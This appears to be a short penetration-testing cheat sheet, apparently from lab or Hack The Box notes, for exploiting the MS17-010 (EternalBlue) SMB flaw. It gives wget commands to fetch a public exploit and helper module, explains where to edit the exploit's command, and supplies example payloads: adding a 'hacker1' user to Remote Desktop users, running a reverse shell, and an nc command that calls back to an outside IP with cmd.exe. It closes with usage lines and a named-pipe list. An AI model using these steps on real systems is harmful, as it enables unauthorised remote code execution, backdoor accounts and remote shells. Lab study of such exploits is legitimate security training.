# MS17-010 Eternalblue

```bash
wget https://www.exploit-db.com/download/42315 -O MS17-010.py
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
```

Modify accordingly for remote command to be executed at approximately Line 916
examples:

`service_exec(conn, r'cmd /c net localgroup "Remote Desktop users" hacker1 /add')`

`service_exec(conn, r'cmd /c reverse_shell.exe')`

`service_exec(conn, r'cmd /c \\10.11.1.227\share\nc.exe 10.11.0.69 5555 -e cmd.exe')`

Usage:
```bash
python MS17-010.py <ip> <pipe>
```

For pipes you could use the following:
```bash
pipe list:
root@kali:/mnt/hgfs/HTB/blue/exploit# cat /usr/share/metasploit-framework/data/wordlists/named_pipes.txt
netlogon
lsarpc
samr
browser
atsvc
DAV RPC SERVICE
epmapper
eventlog
InitShutdown
keysvc
lsass
LSM_API_service
ntsvcs
plugplay
protected_storage
router
SapiServerPipeS-1-5-5-0-70123
scerpc
srvsvc
tapsrv
trkwks
W32TIME_ALT
wkssvc
PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
db2remotecmd
```
